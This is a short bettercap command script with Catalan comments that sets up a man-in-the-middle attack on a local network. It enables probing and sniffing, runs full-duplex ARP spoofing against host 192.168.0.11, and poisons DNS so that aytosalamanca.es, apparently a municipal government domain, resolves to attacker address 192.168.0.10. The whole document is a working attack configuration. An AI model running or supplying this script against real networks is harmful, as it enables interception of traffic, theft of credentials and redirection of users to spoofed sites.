#Activa l'exploració de la xarxa.
net.probe on 
#Estableix la capacitat de 'olfatejar' el trànsit local de la xarxa.
set net.sniff.local true 
#Activa l'olfateig del trànsit de xarxa.
net.sniff on 
#Configura l'atac d'ARP spoofing en mode de dúplex complet.
set arp.spoof.full-duplex true 
#Estableix l'objectiu de l'atac d'ARP spoofing a la direcció IP 192.168.0.11.
set arp.spoof.targets 192.168.0.11 
#Activa l'atac d'ARP spoofing.
arp.spoof on 
#Configura l'empoisonament DNS pel domini aytosalamanca.es.
set dns.spoof.domains aytosalamanca.es 
#Estableix la direcció IP a la qual es redirigirà el trànsit DNS pel domini aytosalamanca.es.
set dns.spoof.address 192.168.0.10 
#Activa l'empoisonament DNS.
dns.spoof on 
